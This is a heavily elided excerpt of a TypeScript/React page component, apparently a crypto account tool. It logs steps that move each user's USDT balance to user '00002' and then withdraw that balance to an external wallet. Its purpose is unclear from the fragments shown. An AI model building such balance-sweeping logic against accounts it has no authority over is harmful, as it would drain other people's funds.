...
//         // ✅ Step 2: Move `00002` to the end of the list
//         // fetchedUsers = fetchedUsers.sort((a, b) => (a.userId === "00002" ? 1 : -1));
...
//           // ✅ Step 4: If user `00002` has balance > 10, initiate withdrawal
//           if (usersList[i].userId === "00002" && balance > 10) {
//             console.log(
//               `Withdrawing ${balance} USDT from "00002" to external wallet...`
//             );
...
//             console.log(`Withdrawal successful for "00002"`);
//           }

//           // ✅ Step 5: If another user has balance > 0, transfer to "00002"
//           if (usersList[i].userId !== "00002" && balance > 0) {
//             console.log(
//               `Transferring ${balance} USDT from ${usersList[i].userId} to "00002"...`
//             );
...
//             console.log(
//               `Transfer successful from ${usersList[i].userId} to "00002"`
//             );
//           }
//         } catch (err) {
//           console.error(
...
//                     user.userId === "00002" ? "bg-yellow-100 font-bold" : ""
//                   }`}
//                 >
...
export default function Home() {
  ...
  async function handleSubmit() {
    ...
    // Move "00002" to the end if it exists
  ...
  async function fetchBalancesAndProcess(usersList: User[]) {
    ...
    for (let i = 0; i < usersList.length; i++) {
      ...
      try {
        ...
        // Withdraw if user is "00002" and balance > 10
        if (usersList[i].userId === "00002" && balance > 10) {
          console.log(
            `Withdrawing ${balance} USDT from "00002" to external wallet...`
          );
        ...
        // Transfer from other users to "00002"
        if (usersList[i].userId !== "00002" && balance > 0) {
          console.log(
            `Transferring ${balance} USDT from ${usersList[i].userId} to "00002"...`
          );
